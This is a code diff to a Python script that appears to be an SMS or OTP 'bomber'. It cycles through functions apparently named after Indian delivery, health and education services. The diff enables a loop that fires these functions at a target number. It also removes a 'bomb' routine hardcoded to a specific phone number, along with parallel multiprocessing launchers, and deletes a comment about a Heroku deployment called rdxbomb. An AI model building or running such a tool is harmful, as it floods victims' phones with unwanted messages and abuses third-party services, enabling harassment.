@@ -379,58 +379,34 @@ funclist = [swigy,myupchar,pizzahut,dominos,unacademy,medlife,lybrate,netmeds,ho
 
 
 
-# for i in range(int(fq)):
-#     sf = random.choice(funclist)
-#     sf(mn)
+for i in range(int(fq)+5):
+    sf = random.choice(funclist)
+    sf(mn)
 
 
+# if __name__ == "__main__":
+#     t1 = multiprocessing.Process(target=bomb)
+#     t2 = multiprocessing.Process(target=bomb)
+#     # t3 = multiprocessing.Process(target=bomb)
+#     # t4 = multiprocessing.Process(target=bomb)
+#     # t5 = multiprocessing.Process(target=bomb)
+#     # t6 = multiprocessing.Process(target=bomb)
+#     # t7 = multiprocessing.Process(target=bomb)
+#     # t8 = multiprocessing.Process(target=bomb)
 
-def bomb():
-    for i in range(5):
-        sf = random.choice(funclist)
-        sf("7668165683")
+#     t1.start()
+#     t2.start()
+#     # t3.start()
+#     # t4.start()
+#     # t5.start()
+#     # t6.start()
+#     # t7.start()
+#     # t8.start()
 
-
-
-
-
-# t1 = multiprocessing.Process(target=bomb)
-# t2 = multiprocessing.Process(target=bomb)
-# t1.start()
-
-# time.sleep(1)
-# t2.start()
-
-
-
-
-if __name__ == "__main__":
-    t1 = multiprocessing.Process(target=bomb)
-    t2 = multiprocessing.Process(target=bomb)
-    # t3 = multiprocessing.Process(target=bomb)
-    # t4 = multiprocessing.Process(target=bomb)
-    # t5 = multiprocessing.Process(target=bomb)
-    # t6 = multiprocessing.Process(target=bomb)
-    # t7 = multiprocessing.Process(target=bomb)
-    # t8 = multiprocessing.Process(target=bomb)
-
-    t1.start()
-    t2.start()
-    # t3.start()
-    # t4.start()
-    # t5.start()
-    # t6.start()
-    # t7.start()
-    # t8.start()
-
-    t1.join()
-    t2.join()
+#     t1.join()
+#     t2.join()
 
 
-
-
-
-# os.system("heroku run:detached python changeworker.py del rdxbomb -app rdxbomb")
 
 
 
